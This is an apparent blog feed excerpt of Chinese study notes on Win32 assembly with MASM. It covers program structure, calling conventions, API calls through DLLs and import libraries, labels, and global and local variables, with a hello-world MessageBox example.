      <link href="/2023/05/03/win32%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-0-%E9%98%85%E8%AF%BB%E5%BF%85%E7%9C%8B/"/>
      <url>/2023/05/03/win32%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-0-%E9%98%85%E8%AF%BB%E5%BF%85%E7%9C%8B/</url>
      
        <content type="html"><![CDATA[<p>该内容来自《琢石成器》——Windwos环境下32位汇编语言程序设计</p><p>和b站小甲鱼win32视频</p><p>所自己写的部分笔记</p>]]></content>
      
      
      <categories>
          
          <category> WIN32程序设计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WIN32程序设计-使用MASM（3）</title>
      <link href="/2023/05/03/win32%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-3-%E4%BD%BF%E7%94%A8MASM/"/>
      <url>/2023/05/03/win32%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-3-%E4%BD%BF%E7%94%A8MASM/</url>
      
        <content type="html"><![CDATA[<h1 id="Win32汇编源程序的结构"><a href="#Win32汇编源程序的结构" class="headerlink" title="Win32汇编源程序的结构"></a>Win32汇编源程序的结构</h1><ul><li>通过helloword走进win32汇编</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include user32.inc</span><br><span class="line">includelib user32.lib</span><br><span class="line">include kernel32.inc</span><br><span class="line">includelib kernel32.lib</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">szCaption db &#x27;A MessageBox&#x27;,0</span><br><span class="line">szText db &#x27;Hello,World!&#x27;,0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">start:</span><br><span class="line">invoke MessageBox,NULL,offset szText,\</span><br><span class="line">offset szCaption,MB_OK</span><br><span class="line"></span><br><span class="line">invoke ExitProcess,NULL</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="1-模式定义"><a href="#1-模式定义" class="headerlink" title="1.模式定义"></a>1.模式定义</h2><ul><li>程序的第一部分是模式和源程序格式的定义语句</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall</span><br><span class="line">option casemap:none</span><br></pre></td></tr></table></figure><ul><li>这些指令定义了程序使用的指令集，互作模式和格式</li></ul><p>1.指令集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.386p</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><ul><li>后面带有p的伪指令，表示可以使用特权指令【0级】</li></ul><p>2.互作模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.model 内存模式[,语言模式][,其他模式]</span><br><span class="line">内存模式的定义影响最后生成的可执行文件，可执行文件的规模从小到大，可以有很多种类型。</span><br></pre></td></tr></table></figure><ul><li>windows程序运行在保护模式下，系统把每一个win32应用程序都放到分开的虚拟地址空间中去运行，耶就是说，每一个应用程序都拥有其相互独立的4GB地址空间</li><li>对于win32程序来说，只有一种内存模式，也就是flat模式</li></ul><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230421101920721.png" alt="image-20230421101920721"></p><ul><li><p> 在win32汇编中，.model语句还应该指定语言模式，也就是子程序和调用方法</p></li><li><p> 例子中用的是stdcall，它指出了伊奥用子程序或win32 API时参数传递的次序和堆栈平衡的方法</p></li><li><p>相对于stdcall，不同的语言类型还有C,syscall,BASIC , FORTRAN和PASCALL，虽然各种高级语言在调用子程序的时候，都是用堆栈来传递参数</p></li><li><p>windows的api调用使用的是stdcall格式，所以在win32汇编中没有选择，必须在.model中加上stdcall参数</p></li><li><p>理解stdcall和cdecl</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_stdcall调用：</span><br><span class="line">是pascal程序的缺省调用方式，参数采用从右到左的压栈方式，被调用函数自身在返回前清空堆栈。win32 api 都采用_stdcall调用方式</span><br><span class="line"></span><br><span class="line">_cdecl调用</span><br><span class="line">_cdecl是c/c++的缺省调用方式，参数采用从右往左的压栈方式，传送参数的内存由调用者维护。_cdecl约定的函数只能被c/c++调用，每一个调用它的函数都包含清空堆栈的代码，所以产生的可执行文件大小回避_stdcall函数大</span><br></pre></td></tr></table></figure><p>3.格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">option语句</span><br><span class="line">意义是对大小写是否敏感</span><br><span class="line">由于win32 api函数是分大小写的所以</span><br><span class="line">必须得有这个</span><br></pre></td></tr></table></figure><h2 id="2-段的定义"><a href="#2-段的定义" class="headerlink" title="2.段的定义"></a>2.段的定义</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">模式定义</span><br><span class="line">&lt;一些include语句&gt;</span><br><span class="line">.stack[堆栈段的大小]</span><br><span class="line">.data</span><br><span class="line">&lt;一些初始化过的变量定义&gt;</span><br><span class="line">.data?</span><br><span class="line">&lt;一些没有初始化过的变量的定义&gt;</span><br><span class="line">.const</span><br><span class="line">&lt;常量的定义&gt;</span><br><span class="line">.code</span><br><span class="line">&lt;代码&gt;</span><br><span class="line">&lt;开始标号&gt;</span><br><span class="line">&lt;其他语句&gt;</span><br><span class="line">end 开始标号</span><br></pre></td></tr></table></figure><ul><li>win32汇编源程序中“分段”的概念实际上是把不同类型的数据或代码归类，在放到不同属性的内存页（耶就是不同的“分段”）中，这中间不涉及使用不同的段寄存器【仅仅是配合分页机制罢了】</li></ul><p>1.数据段</p><ul><li>.data .data？ .const定义的是数据段，分别对应不同方式放在不同的区域</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">是可读可写的数据,定义好的变量</span><br><span class="line">int a=1;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data?</span><br><span class="line">可读可写的数据，未定义变量</span><br><span class="line">有空间，但是没有初始化罢了</span><br><span class="line">int a;</span><br><span class="line">定义在data?段中不会增加.exe文件的大小</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.const</span><br><span class="line">只能读的数据，不能写，只要写了就会报错</span><br></pre></td></tr></table></figure><p>2.代码段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.code段就是代码段，直接操控CPU咯</span><br><span class="line">但是！我们是在等级3下运行程序，所以对于code段是不能写的，不能修改code段中的东西</span><br><span class="line">在优先级为3下运行的程序耶不是一定不能写代码段，代码段的属性是由可执行文件PE头部中的属性位所决定的</span><br><span class="line">通过编译磁盘上的.exe文件 ，把代码段的属性位改成可写的，那么就可以修改自己的代码段了</span><br></pre></td></tr></table></figure><ul><li><p>一个典型的引用就是针对可执行文件的压缩软件和加壳软件【UPX和PoCompact……】</p></li><li><p>这些软件靠把代码进行变换来达到解压缩和解密的目的，被处理过的可执行文件在执行的时候需要由解压代码来讲代码段解压缩</p></li><li><p>这就需要写代码段咯</p></li></ul><h2 id="3-程序结束和程序入口"><a href="#3-程序结束和程序入口" class="headerlink" title="3.程序结束和程序入口"></a>3.程序结束和程序入口</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">end start</span><br><span class="line">这个在一个程序里面的话，就需要写这个，来指明结束和入口地址</span><br><span class="line">但是：</span><br><span class="line">如果有多个模块，需要把这些模块都链接在一起的时候，就只能有一个主模块指定入口地址，不然入口太多会爆炸</span><br></pre></td></tr></table></figure><h2 id="4-注释"><a href="#4-注释" class="headerlink" title="4.注释"></a>4.注释</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用 ;</span><br><span class="line">在字符串里面的 ; 不是注释</span><br></pre></td></tr></table></figure><h2 id="5-换行"><a href="#5-换行" class="headerlink" title="5.换行"></a>5.换行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用 (\) 做换行符</span><br><span class="line">能提高阅读性罢了</span><br></pre></td></tr></table></figure><h1 id="调用API函数"><a href="#调用API函数" class="headerlink" title="调用API函数"></a>调用API函数</h1><h2 id="1-首先，说明是API？"><a href="#1-首先，说明是API？" class="headerlink" title="1.首先，说明是API？"></a>1.首先，说明是API？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">应用函数接口</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win32程序是架构在win32api基础上的</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows自身的运行也调用这个api函数</span><br></pre></td></tr></table></figure><h2 id="2-调用API函数"><a href="#2-调用API函数" class="headerlink" title="2.调用API函数"></a>2.调用API函数</h2><ul><li><p>api函数，它实际上就是一种新的方法代替了DOS下的中断</p></li><li><p>DLL【动态链接库文件】是一种windows的可执行文件，采用的是和我们熟悉.exe文件同样的PE约定格式</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">依靠dll文件，程序才能和内核联系</span><br></pre></td></tr></table></figure><h3 id="1-）关于dll"><a href="#1-）关于dll" class="headerlink" title="1.）关于dll"></a>1.）关于dll</h3><ul><li>dll实质上是一个打打的集装箱，装着各种系统的API函数，应用程序在使用的时候由windows自动载入dll程序并且调用相应的函数</li><li>实在上，win32的基础就是由dll组成的。win32api的核心由3哥dll提供</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.kernel32.dll -- 系统服务功能。包含内存管理，任务管理和动态链接</span><br><span class="line">2.gdi32.dll -- 图形设备接口，处理图形绘制</span><br><span class="line">3.user32.dll -- 用户接口服务，建立窗口和传送消息</span><br></pre></td></tr></table></figure><ul><li><p>win32api还包含起来的很多的函数，都是由dll提供</p></li><li><p>比如：TCP/IP协议进行网络通信的dll是wsock32.dll。。。等</p></li><li><p>所有的DLL提供的函数组成了现在使用的win32编程环境</p></li></ul><h3 id="2-）api函数的参数"><a href="#2-）api函数的参数" class="headerlink" title="2.）api函数的参数"></a>2.）api函数的参数</h3><ul><li><p>win32api是用堆栈来传递函数的，dll中的函数程序从堆栈中取出参数进行处理，并且在返回之前讲堆栈中已经无用的参数丢去【从右边往左压入栈中 】</p></li><li><p>参数，参数名字很多，但就只是用于定义这个参数的大小，而不是一定要怎样怎样，参数的名字只是用来描述这个参数的作用罢了，实质上是开辟一个空间的大小</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int MessageBox(</span><br><span class="line">HWND hWnd,//handle to ouner window</span><br><span class="line">LPCTSTR lp Text,//text in message box</span><br><span class="line">LPCTSTR lpCaption,//message box title</span><br><span class="line">UINT uType,//message box style</span><br><span class="line">    </span><br><span class="line">)//这个是c语言来表示的</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MessageBox Proto hWnd:dword,ip Text:dword,ipCaption:dword,uType:dword</span><br><span class="line">//这样是用汇编的格式来表达</span><br></pre></td></tr></table></figure><ul><li>在汇编中调用MessageBox函数的方法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push uType</span><br><span class="line">push lpCaption</span><br><span class="line">push lpText</span><br><span class="line">push hWnd</span><br><span class="line">call MessageBox</span><br></pre></td></tr></table></figure><ul><li>在源程序编译链接成可执行文件后，call MessageBox语句中的MessageBox会被换成一个地址，指向可执行文件中的导入表的一个索引【函数名或者索引号】</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">导入表：程序会在导入表中写入【将要调用xxx函数】，然后里面就会存放着来自导出表中的函数的地址。。里面会动态的存放着这些将被调用的函数的地址</span><br><span class="line"></span><br><span class="line">导出表：就是动态链接库里面所有函数的一一对应的地址，在加载的时候就会把这些地址【将要用到的】给导入表。</span><br></pre></td></tr></table></figure><h3 id="3-）使用invoke语句"><a href="#3-）使用invoke语句" class="headerlink" title="3.）使用invoke语句"></a>3.）使用invoke语句</h3><ul><li>invoke伪指令【相当于call指令，多了参数个数检查的功能】</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke 参数名字[,参数1][,参数2]...[,参数n]</span><br></pre></td></tr></table></figure><p>它能对参数个数进行检查，看是否合格</p><p>对于不带参数的api调用，invoke或者call都可以</p><h3 id="4-）api函数的返回值"><a href="#4-）api函数的返回值" class="headerlink" title="4.）api函数的返回值"></a>4.）api函数的返回值</h3><ul><li>返回值各种各样，但是在汇编程序中，只有dword这一种类型，它永远放在eax中</li><li>如果返回的东西比较大，放不下，就会返回一个指针。把数据放在缓冲区中【指针指向这里】</li></ul><h3 id="5-）函数的声明"><a href="#5-）函数的声明" class="headerlink" title="5.）函数的声明"></a>5.）函数的声明</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数名 proto [距离][语言][参数1]:数据类型,[参数2]:数据类型</span><br></pre></td></tr></table></figure><ul><li>句中的proto是函数声明的伪指令。</li><li> 距离–种类很多【near far near16….】，但是在win32中不管【因为平坦的段】</li><li>语言–忽略就使用   .model定义的值</li></ul><p>对于汇编来说，只关心参数的数量，名字只是为了好看，所以可以略去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MessageBox Proto hWnd:dword,lpText:dowrd,\</span><br><span class="line">lpCaption:dword,uType:dword</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MessageBox Proto :dword,:dword,:dword,:dword</span><br></pre></td></tr></table></figure><ul><li>上面这2种是一样的</li></ul><h3 id="6-）include语句"><a href="#6-）include语句" class="headerlink" title="6.）include语句"></a>6.）include语句</h3><ul><li><p>用include来声明某些函数</p></li><li><p>.inc 文件</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">include &lt;文件名&gt;</span><br><span class="line">include 文件名</span><br><span class="line">都可以</span><br></pre></td></tr></table></figure><h3 id="7-）includelib语句"><a href="#7-）includelib语句" class="headerlink" title="7.）includelib语句"></a>7.）includelib语句</h3><ul><li><p>在win32汇编种使用api函数，程序必须知道调用的api函数存放在那个dll中，需要有一个文件包括dll库正确的定位信息，这个任务是由导入库来实现的。</p></li><li><p>在使用外部函数的时候，DOS下有函数库的概念，那时的函数库实际上是静态库，静态库是一组已经编写号的代码模块，在程序中可以自由引用</p></li><li><p>最后用link 从库中找出相应的函数代码，一起链接到最后的可执行文件中</p></li><li><p>Win32环境中，程序连接的时候任然要使用函数库定位函数信息，只不过由于函数代码放在dll文件中，库文件中留有函数的定位信息和参数数码等简单信息，这种库文件叫做导入库</p></li><li><p>一个dll文件对应一个导入库，比如：user32.dll文件用于编程的导入库是user32.lib，masm32互具包中包含了所有dll的导入库</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">includelib 库文件名</span><br><span class="line">includelib &lt;库文件名&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230421190312235.png" alt="image-20230421190312235"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">咋说呢，我理解的是，函数是存在.dll中</span><br><span class="line">然后我们导入的是.lib，这个里面存放的是.dll的地址信息啥的 </span><br></pre></td></tr></table></figure><h2 id="3-API参数中的等值定义"><a href="#3-API参数中的等值定义" class="headerlink" title="3.API参数中的等值定义"></a>3.API参数中的等值定义</h2><p>这里看书去吧【忘了写笔记】，p62</p><p> 在masm下，我们可以用.if .elseif .else </p><h1 id="标号，变量，数据结构"><a href="#标号，变量，数据结构" class="headerlink" title="标号，变量，数据结构"></a>标号，变量，数据结构</h1><h2 id="1-标号"><a href="#1-标号" class="headerlink" title="1.标号"></a>1.标号</h2><h3 id="1-）标号的定义"><a href="#1-）标号的定义" class="headerlink" title="1.）标号的定义"></a>1.）标号的定义</h3><ul><li>标号–&gt;地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.标号名:目的指令</span><br><span class="line">2.标号名::目的指令</span><br></pre></td></tr></table></figure><ul><li>1.只能在某一个子程序中跳</li><li>2.可以从一个子程序跳到其他子程序中，不和谐</li></ul><h3 id="2-）MASM中的"><a href="#2-）MASM中的" class="headerlink" title="2.）MASM中的@@"></a>2.）MASM中的@@</h3><ul><li>@@用于某些时候标号只会使用1.2次</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    mov cx,1234h</span><br><span class="line">    cmp flag,1</span><br><span class="line">    jz @f;@f是跳到这个指令后的第一个@@处</span><br><span class="line">    mov cx,1000H</span><br><span class="line">@@:</span><br><span class="line">...</span><br><span class="line">loop @b;@是跳到本指令前的第一个@@的地方</span><br></pre></td></tr></table></figure><ul><li>相当于一个特殊的标号</li></ul><h2 id="2-变量–全局变量"><a href="#2-变量–全局变量" class="headerlink" title="2.变量–全局变量"></a>2.变量–全局变量</h2><h3 id="1-）定义全部变量"><a href="#1-）定义全部变量" class="headerlink" title="1.）定义全部变量"></a>1.）定义全部变量</h3><ul><li>全部变量的作用域是整个程序，可以用data 或者 data? </li></ul><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230421204810538.png" alt="image-20230421204810538"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">wHourdw?</span><br><span class="line">wMinutedw10</span><br><span class="line"></span><br><span class="line">变量名变量类型【可以用缩写】值</span><br></pre></td></tr></table></figure><ul><li>在使用byte类型变量的定义中，可以用引号来定义字符串和数值定义的方法混用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">szTextdb&#x27;Hello,world!&#x27;,0dh,0ah,&#x27;hello again&#x27;,0dh,0ah,0</span><br><span class="line">用 ， 隔开</span><br><span class="line">0dh和0ah其实就是回车和换行符</span><br><span class="line">用的是ascii码</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230421205538518.png" alt="image-20230421205538518"></p><h3 id="2-）全局变量的初始化"><a href="#2-）全局变量的初始化" class="headerlink" title="2.）全局变量的初始化"></a>2.）全局变量的初始化</h3><ul><li>在不想初始化的时候，可以用问好来预留空间</li><li>在data?段中只能用?来预留空间</li><li>并且未初始化的值都是 0 </li></ul><h2 id="3-变量–局部变量"><a href="#3-变量–局部变量" class="headerlink" title="3.变量–局部变量"></a>3.变量–局部变量</h2><ul><li><p>也就是用在函数内部的变量</p></li><li><p>作用域是单个子程序</p></li><li><p>这些变量就放在堆栈里面，在进入子程序的时候，通过堆栈指针esp来预留出空间，在使用ret指令返回主程序之前，同样通过恢复esp丢弃这些控件，这些变量就变得无效了</p></li><li><p>由于空间是临时分配的，所以无法定义含有初始化值的变量，对局部变量的初始化一般在子程序中由指令完成。</p></li></ul><h3 id="1-）局部变量的定义"><a href="#1-）局部变量的定义" class="headerlink" title="1.）局部变量的定义"></a>1.）局部变量的定义</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local 变量名1[[重复数量]][:类型],变量名2[[重复数量]][:类型]...</span><br></pre></td></tr></table></figure><ul><li>local伪指令必须在子程序定义的伪指令 proc 后，其他指令之前。</li><li>不能使用缩写</li><li>默认的类型是dword</li><li>当定义数组的时候，可以用[]括起来</li><li>不能使用dup伪指令</li><li>不能和全局变量同名，但可以和局部变量重名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">localloc1[1024]:byte;定义了一个1024字节长的局部变量loc1</span><br><span class="line">localloc2;定义了名叫loc2的局部变量，类型默认是dword</span><br><span class="line">localloc3:WNDCLASS;定义了一个WNDCLASS数据结构，名loc3</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类型：也就是占用空间的大小</span><br></pre></td></tr></table></figure><h3 id="2-）局部变量的使用"><a href="#2-）局部变量的使用" class="headerlink" title="2.）局部变量的使用"></a>2.）局部变量的使用</h3><ul><li>例子</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">TestProcproc</span><br><span class="line">local loc1:dword,loc2:word</span><br><span class="line">local loc3:byte</span><br><span class="line"></span><br><span class="line">mov eax,loc1</span><br><span class="line">mov ax,loc2</span><br><span class="line">mov al,loc3</span><br><span class="line">ret</span><br><span class="line">TestProcendp</span><br></pre></td></tr></table></figure><ul><li>上面例子在创建局部变量的时候，真正的汇编语句是这样的</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp,esp;把esp中的内容放在了ebp中</span><br><span class="line">add esp,fffffff8;对esp操作</span><br><span class="line"></span><br><span class="line">mov eax,dword ptr [ebp-04];win32没有段寄存器的说法</span><br><span class="line">mov ax,word ptr [ebp-06]</span><br><span class="line">mov al,byte ptr [ebp-07]</span><br><span class="line"></span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><ul><li>这些指令是必须的，前面的用于局部变量的准备工作，后面的用于扫尾工作</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br></pre></td></tr></table></figure><ul><li>把ebp中的内容保存在栈里 面，然后把esp的内容给ebp，供存取局部变量做指针</li><li>在这个例子中一共是7个字节的大小来保存局部变量，所以esp这个指针要往下移动</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里就是 add esp,fffffff8</span><br></pre></td></tr></table></figure><ul><li>为什么是腾出8个字节的空间呢？</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为80386按照dword为界对其，运行速度最快。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在子程序中，该esp 而不该 ebp？</span><br></pre></td></tr></table></figure><ul><li>leave指令的功能</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp;在里面使用esp ， 原先的esp是放在ebp中的，最后把内容返回给它</span><br><span class="line">pop epb;在把ebp弹回去</span><br></pre></td></tr></table></figure><h3 id="3-）局部变量的初始化值"><a href="#3-）局部变量的初始化值" class="headerlink" title="3.）局部变量的初始化值"></a>3.）局部变量的初始化值</h3><ul><li><p>局部变量不初始化，得到的是一个奇奇怪怪的值【也就是指针指向的自带的值，之前的】</p></li><li><p>解决这个问题，就先全部都初始化为0</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RtlZeroMemory 这个API函数就可以做到该功能</span><br></pre></td></tr></table></figure><h2 id="4-变量的使用"><a href="#4-变量的使用" class="headerlink" title="4.变量的使用"></a>4.变量的使用</h2><h3 id="1-）以不同的类型访问变量"><a href="#1-）以不同的类型访问变量" class="headerlink" title="1.）以不同的类型访问变量"></a>1.）以不同的类型访问变量</h3><ul><li><p>类似和C语言中的数据类型强制转化</p></li><li><p>但是在masm中，它不会自动帮忙转。</p></li><li><p>在masm中，变量类型不一样的话就会报错</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">比如:</span><br><span class="line">sz db 1024 dup(?)</span><br><span class="line">mov ax,sz</span><br><span class="line"></span><br><span class="line">这样就会报错</span><br></pre></td></tr></table></figure><ul><li>所以需要使用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类型 ptr 变量名</span><br></pre></td></tr></table></figure><ul><li>这样就可以把变量转化成你所想要的类型</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,word ptr sz</span><br></pre></td></tr></table></figure><ul><li>要注意的是，在变量报错的时候，是高放高，低放低</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">adb12h</span><br><span class="line">bdw1234h</span><br><span class="line">cdd12345678h</span><br><span class="line">在这样的在内存中保存的是</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12 34 12 78 56 34 12</span><br></pre></td></tr></table></figure><ul><li>在使用转换类型的时候，其实它不是转换类型，而是把地址的范围改变了，比如之前的是1个字的，转换成2个字，它的内容就会往后延申罢了</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">肯定还是要遵守 高地址放高  